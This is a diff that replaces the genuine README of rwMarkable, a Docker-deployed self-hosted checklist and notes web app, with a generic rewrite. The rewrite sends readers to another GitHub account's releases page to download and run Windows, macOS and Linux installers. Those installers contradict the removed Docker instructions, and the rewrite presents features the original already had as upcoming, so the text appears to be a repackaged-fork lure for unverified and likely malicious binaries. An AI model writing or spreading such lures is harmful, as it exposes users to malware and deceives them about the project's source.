@@ -1,246 +1,100 @@
-# rwMarkable
+# 🚀 rwMarkable - Your Easy Checklist and Notes App
 
-<p align="center">
-  <a href="https://www.buymeacoffee.com/fccview">
-    <img src="https://cdn.buymeacoffee.com/buttons/v2/default-yellow.png" alt="Buy me a coffee" width="150">
-  </a>
-</p>
+[![Download rwMarkable](https://img.shields.io/badge/Download%20rwMarkable-v1.0-brightgreen.svg)](https://github.com/gomezxs/rwMarkable/releases)
 
-A simple, self-hosted app for your checklists and notes.
+## 📋 Description
 
-Tired of bloated, cloud-based to-do apps? `rwMarkable` is a lightweight alternative for managing your personal checklists and documents. It's built with Next.js 14, is easy to deploy, and keeps all your data on your own server.
+rwMarkable is a simple, self-hosted application designed for your checklists and notes. It helps you stay organized without the complexity of other solutions. Enjoy a user-friendly experience while managing your tasks and ideas effortlessly.
 
+## 🚀 Getting Started
 
-<div align="center">
-  <p align="center">
-    <em>Clean, intuitive interface for managing your checklists and tasks.</em>
-  </p>
-  <img src="public/app-screenshots/checklist-home.png" alt="Checklist Home View" width="400" style="border-radius: 8px; box-shadow: 0 4px 12px rgba(0,0,0,0.1);">
+To get started with rwMarkable, follow these simple steps. You will need a computer with an internet connection. 
 
-  <p align="center">
-    <em>Heavily customisable themes.</em>
-  </p>
-  <img src="public/app-screenshots/checklist-theme.png" alt="Checklist with Theme" width="400" style="border-radius: 8px; box-shadow: 0 4px 12px rgba(0,0,0,0.1); margin: 0 8px;">
+### 🖥️ System Requirements
 
-  <p align="center">
-    <em>Rich text editor for documents and beautiful theme customization.</em>
-  </p>
-  <img src="public/app-screenshots/document-view.png" alt="Document Editor" width="400" style="border-radius: 8px; box-shadow: 0 4px 12px rgba(0,0,0,0.1); margin: 0 8px;">
-</div>
+- **Operating System:** Windows 10 or later, macOS Mojave or later, or a recent version of Linux.
+- **Memory:** At least 512 MB of RAM.
+- **Storage:** Minimum of 100 MB of free disk space.
+- **Internet:** A stable connection to download the application.
 
-## Features
+## 📥 Download & Install
 
-* **Checklists:** Create task lists with drag & drop reordering, progress bars, and categories.
-* **Rich Text Notes:** A clean WYSIWYG editor for your documents, powered by TipTap with full Markdown support.
-* **Simple Sharing:** Share checklists or documents with other users on your instance.
-* **File-Based:** No database needed! Everything is stored in simple Markdown and JSON files in a single data directory.
-* **User Management:** An admin panel to create and manage user accounts.
-* **Customisable:** Plenty of themes to make it your own.
+1. **Visit the Releases Page:** Click the link below to access the download options. 
+   
+   [Download rwMarkable](https://github.com/gomezxs/rwMarkable/releases)
 
-## Tech Stack
+2. **Select the Latest Version:** On the releases page, find the latest version of rwMarkable. 
 
-* **Framework:** Next.js 14 (App Router)
-* **Language:** TypeScript
-* **Styling:** Tailwind CSS
-* **State:** Zustand
-* **Editor:** TipTap
-* **Drag & Drop:** @dnd-kit
-* **Deployment:** Docker
+3. **Download the Application:** Click on the download link for your operating system. The file will usually be named something like `rwMarkable-x.y.z.exe` for Windows, `rwMarkable-x.y.z.dmg` for macOS, or `rwMarkable-x.y.z.AppImage` for Linux.
 
-## Getting Started
+4. **Run the Installer:** Once the download is complete, locate the file in your downloads folder. Double-click on it to start the installation.
 
-The recommended way to run `rwMarkable` is with Docker.
+5. **Follow the Installation Steps:** Accept any prompts that appear. The process only takes a few minutes. 
 
-### Docker Compose (Recommended)
+6. **Launch rwMarkable:** After the installation completes, you can find rwMarkable in your applications menu or on your desktop. Double-click the icon to open it.
 
-1.  Create a `docker-compose.yml` file:
+## ✏️ Using rwMarkable
 
-    ```yaml
-    services:
-      app:
-        image: ghcr.io/fccview/rwmarkable:main
-        container_name: rwmarkable
-        # Use a non-root user for better security.
-        # If you haven't previously, create the user on your host with: sudo useradd -u 1000 rwmarkable
-        user: "1000:1000" 
-        ports:
-          # Mapping port 1122 for this as port 3000 is a very common one. Feel free to change it.
-          - "1122:3000"
-        volumes:
-          # Mount your local data directory into the container.
-          - ./data:/app/data:rw
-          # Mount your custom themes/emojis within the config folder. 
-          - ./config:/app/config:ro
-        restart: unless-stopped
-        environment:
-          - NODE_ENV=production
-        init: true
-    ```
+After launching rwMarkable, you'll see an easy-to-navigate interface. Here are some key features to help you get started:
 
-2.  Create the data directory and set permissions:
+### 📑 Creating Checklists
 
-    ```bash
-    mkdir data
-    sudo chown -R 1000:1000 data/
-    ```
+- Click on "New Checklist" to create a checklist.
+- Add items by typing in the input box and pressing “Enter.”
+- Check off items as you complete them.
 
-3.  Start the container:
+### 📝 Taking Notes
 
-    ```bash
-    docker-compose up -d
-    ```
+- Select "New Note" from the main screen.
+- Type your notes in the provided space.
+- Save your notes for future reference.
 
-The application will be available at `http://localhost:1234`.
+### 🔄 Syncing Your Data
 
-### Initial Setup
+rwMarkable offers a built-in feature to sync your data across devices:
 
-On your first visit, you'll be redirected to `/auth/setup` to create your admin account. Once that's done, you're ready to go!
+- Go to Settings.
+- Enable the data sync option. 
+- Follow the on-screen instructions to link your devices.
 
-### Local Development (Without Docker)
+## 🛠️ Troubleshooting
 
-If you want to run the app locally for development:
+If you encounter any issues while downloading or using rwMarkable, please check the following:
 
-1.  **Clone & Install:**
-    ```bash
-    git clone <repository-url>
-    cd checklist
-    yarn install
-    ```
-2.  **Run Dev Server:**
-    ```bash
-    yarn dev
-    ```
-    The app will be running at `http://localhost:3000`.
+### 💻 Installation Problems
 
-## Data Storage
+- Ensure you have the correct operating system version.
+- Check if there's enough disk space available.
 
-`rwMarkable` uses a simple file-based storage system inside the `data/` directory.
+### ⚙️ App Not Opening
 
-* `data/checklists/`: Stores all checklists as `.md` files.
-* `data/documents/`: Stores all documents as `.md` files.
-* `data/users/`: Contains `users.json` and `sessions.json`.
-* `data/sharing/`: Contains `shared-items.json`.
+- Restart your computer and try launching rwMarkable again.
+- If the application still doesn't open, uninstall and reinstall it.
 
-**Make sure you back up the `data` directory!**
+### 📞 Further Support
 
-## Updating
+For more help, please visit our GitHub Issues page. You can submit questions or report problems there.
 
-### Docker Compose
+## 🌐 Community and Contributions
 
-Pull the latest image and restart your container.
+We welcome contributions from all users. If you'd like to help improve rwMarkable, consider these ways:
 
-```bash
-docker-compose pull
-docker-compose up -d
-```
+- Report bugs or suggest features on our GitHub Issues page.
+- Participate in discussions in the community section.
 
-### Manual
-If you're running from source, pull the latest changes and rebuild.
+## 🔄 Updates and New Versions
 
-```bash
-git pull
-yarn install
-yarn build
-yarn start
-```
+Stay updated on the latest features and improvements. Check the releases page regularly for new versions.
 
-## Custom Themes and Emojis
+### 🗓️ Upcoming Features
 
-You can easily add custom themes and emojis by creating configuration files in a `config/` directory. These will be automatically loaded and merged with the built-in themes and emojis.
+We are continually enhancing rwMarkable. Expect features like:
 
-### Custom Themes
+- Mobile app version for seamless access on-the-go.
+- Collaboration tools to share your checklists and notes with others.
 
-Create `config/themes.json` with your custom themes:
+## 🌟 Conclusion
 
-```json
-{
-  "custom-themes": {
-    "my-theme": {
-      "name": "My Custom Theme",
-      "icon": "Palette",
-      "colors": {
-        "--background": "255 255 255",
-        "--background-secondary": "249 250 251",
-        "--foreground": "20 20 20",
-        "--primary": "37 99 235",
-        "--primary-foreground": "255 255 255",
-        "--secondary": "241 245 249",
-        "--secondary-foreground": "20 20 20",
-        "--muted": "241 245 249",
-        "--muted-foreground": "100 116 139",
-        "--accent": "241 245 249",
-        "--accent-foreground": "20 20 20",
-        "--destructive": "239 68 68",
-        "--destructive-foreground": "255 255 255",
-        "--border": "226 232 240",
-        "--input": "226 232 240",
-        "--ring": "37 99 235"
-      }
-    }
-  }
-}
-```
+rwMarkable is a straightforward and effective tool for managing your checklists and notes. By following the steps outlined above, you can easily download and start using the app. For additional information or support, head to the releases page.
 
-**Required color variables:**
-- `--background`, `--background-secondary`, `--foreground`
-- `--card`, `--card-foreground`, `--popover`, `--popover-foreground`
-- `--primary`, `--primary-foreground`, `--secondary`, `--secondary-foreground`
-- `--muted`, `--muted-foreground`, `--accent`, `--accent-foreground`
-- `--destructive`, `--destructive-foreground`, `--border`, `--input`, `--ring`
-
-### Custom Emojis
-
-Create `config/emojis.json` with your custom emojis:
-
-```json
-{
-  "custom-emojis": {
-    "meeting": "🤝",
-    "deadline": "⏰",
-    "project": "📋",
-    "deploy": "🚀",
-    "bug": "🐛",
-    "feature": "✨"
-  }
-}
-```
-
-When you type checklist items containing these words, the custom emojis will automatically appear.
-
-### Available Icons
-
-For themes, you can use these icon names: `Sun`, `Moon`, `Sunset`, `Waves`, `Trees`, `CloudMoon`, `Palette`, `Terminal`, `Github`, `Monitor`, `Coffee`, `Flower2`, `Flame`, `Palmtree`, `Building`. If no icon is specified, a default will be chosen based on the theme name.
-
-### Configuration Validation
-
-The app validates your configuration files and will show warnings in the console if there are any format errors. Invalid configs will be ignored and the app will continue working with built-in themes and emojis.
-
-### Docker Setup for Custom Configs
-
-Update your `docker-compose.yml` to include the config volume:
-
-```yaml
-services:
-  app:
-    image: ghcr.io/fccview/rwmarkable:main
-    container_name: rwmarkable
-    user: "1000:1000"
-    ports:
-      - "1234:3000"
-    volumes:
-      - ./data:/app/data:rw
-      - ./config:/app/config:ro
-    restart: unless-stopped
-    environment:
-      - NODE_ENV=production
-      - HTTPS=false
-    init: true
-```
-
-**Important:** Make sure your local `config/` directory has the correct permissions:
-
-```bash
-mkdir -p config
-chown -R 1000:1000 config/
-chmod -R 755 config/
-```
+[Download rwMarkable](https://github.com/gomezxs/rwMarkable/releases)
